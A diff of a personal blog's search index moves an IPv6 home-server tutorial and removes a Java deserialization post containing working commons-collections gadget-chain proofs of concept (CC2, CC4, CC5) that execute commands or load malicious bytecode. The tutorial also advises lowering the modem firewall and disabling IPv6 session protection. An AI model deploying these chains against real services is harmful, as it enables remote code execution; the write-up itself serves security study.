@@ -1,6 +1,57 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>利用ipv6实现公网ip</title>
+    <url>/post/Using-ipv6-to-realize-public-ip/</url>
+    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
+<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
+<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
+<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
+<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
+<p><img src="94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
+<p><img src="e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
+<p><img src="90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
+<p><img src="e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
+<p><img src="6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>ipv6配置</p>
+<p><img src="f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
+<p><img src="8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里光猫的配置就结束了</p>
+<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
+<p><img src="9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>设置防火墙的入站规则，开启80端口</p>
+<p><img src="ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
+<p>对自己的ipv6进行测试</p>
+<p>全都响应了就说明ipv6公网配置成功了<img src="7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
+<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
+<h3 id="一些小缺陷">一些小缺陷</h3>
+<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
+<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
+<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
+<h3 id="接下来的目标">接下来的目标</h3>
+<p>1.购买域名，通过域名访问公网ipv6</p>
+<p>2.在linux系统中配置ipv6公网地址</p>
+<h3 id="大佬的文章">大佬的文章</h3>
+<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
+<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>ipv6</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE漏洞详解</title>
     <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="简介">简介</h1>
@@ -190,57 +241,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>利用ipv6实现公网ip</title>
-    <url>/post/Using-ipv6-to-realize-public-ip/</url>
-    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
-<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
-<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
-<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
-<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
-<p><img src="94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
-<p><img src="e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
-<p><img src="90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
-<p><img src="e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
-<p><img src="6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>ipv6配置</p>
-<p><img src="f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
-<p><img src="8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里光猫的配置就结束了</p>
-<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
-<p><img src="9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>设置防火墙的入站规则，开启80端口</p>
-<p><img src="ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
-<p>对自己的ipv6进行测试</p>
-<p>全都响应了就说明ipv6公网配置成功了<img src="7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
-<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
-<h3 id="一些小缺陷">一些小缺陷</h3>
-<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
-<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
-<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
-<h3 id="接下来的目标">接下来的目标</h3>
-<p>1.购买域名，通过域名访问公网ipv6</p>
-<p>2.在linux系统中配置ipv6公网地址</p>
-<h3 id="大佬的文章">大佬的文章</h3>
-<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
-<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>ipv6</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java反序列化之DNSURL和CommonsCollections</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BDNSURL%E5%92%8CCommonsCollections/</url>
     <content><![CDATA[<h1 id="序列化与反序列化">序列化与反序列化</h1>
@@ -377,55 +377,6 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </tags>
   </entry>
   <entry>
-    <title>java反序列化之cc2和cc4</title>
-    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2%E5%92%8Ccc4/</url>
-    <content><![CDATA[<h1 id="CC4">CC4</h1>
-<p>CC4是针对<code>commons-collections4</code>的4.0版本的一条利用链</p>
-<p>主要是利用<code>TransformingComparator</code>类的<code>compare</code>方法调用了ChainedTransformer类的transform(<code>commons-collections3.2的TransformingComparator无法反序列化</code>)</p>
-<p><img src="image-20230326101200961.png" alt="image-20230326101200961"></p>
-<p>而入口则是PriorityQueue类的readObject方法,整体利用链如下：</p>
-<p>PriorityQueue#readObject</p>
-<p>PriorityQueue#heapify</p>
-<p>PriorityQueue#siftDown</p>
-<p>PriorityQueue#siftDownUsingComparator</p>
-<p>TransformingComparator#compare</p>
-<p>所以通过以下构造方法连成一条链</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br></pre></td></tr></table></figure>
-<p>但有几个需要注意的逻辑点</p>
-<p>在PriorityQueue#heapify中有</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>要想进入循环则必须满足<code>size&gt;&gt;&gt;1要大于0</code>,即变量 “size” 的二进制表示向右移动一位要大于0,size&gt;1</p>
-<p>所以有</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
-<p>但是priorityQueue.add()会调用priorityQueue.offer()进而调用priorityQueue.siftUp(),最终到siftUpUsingComparator()调用了compare方法,也就是说在还没有反序列化之前,就已经命令执行了。</p>
-<p>要解决这个问题方法和之前的一样,<code>在add前断开链,add后在把链接上</code></p>
-<p>故最后的序列化poc就是</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
-<h1 id="CC2">CC2</h1>
-<p>前面提到通过类的动态加载,我们只需要运行<code>templates.newTransformer()</code>方法就可以任意命令执行了</p>
-<p>那么我们可以通过InvokerTransformer类来执行这个方法,就可以实现命令执行</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">invokerTransformer.transform(templates);</span><br></pre></td></tr></table></figure>
-<p>但我们总会遇到一个问题,就是transform的参数不好控制,之前我们都是采用ChainedTransformer+ConstantTransformer来解决的,但在这里,我们的参数是可控的,</p>
-<p>在PriorityQueue#heapify中要向siftDown传入两个参数,而<code>第二个参数就是我们最终传到transform的参数</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>而这个queue[i]就是我们poc中利用priorityQueue.add方法传入的参数,所以我们只需要传入一个</p>
-<p>templates就可以了</p>
-<p>故最终的poc为：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));<span class="comment">//这里不能用ChainedTransformer,否则会报错</span></span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(templates);<span class="comment">//传入templates</span></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
-<p>通过这种方法就可以在不用ChainedTransformer和ConstantTransformer的情况下实现反序列化</p>
-<p>最后附上一张CC链的总图：</p>
-<p><img src="image-20230326145828228.png" alt="image-20230326145828228"></p>
-<h1 id="CC5">CC5</h1>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造lazymap</span></span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//构造BadAttributeValueExpException</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//把链断开，用反射重新连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">BadAttribute_class</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val_field</span> <span class="operator">=</span> BadAttribute_class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val_field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">Test.Serialize(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//Test.Unserialize(&quot;test.ser&quot;);</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java反序列化之RMI</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</url>
     <content><![CDATA[<h1 id="RMI">RMI</h1>
@@ -484,70 +435,46 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </tags>
   </entry>
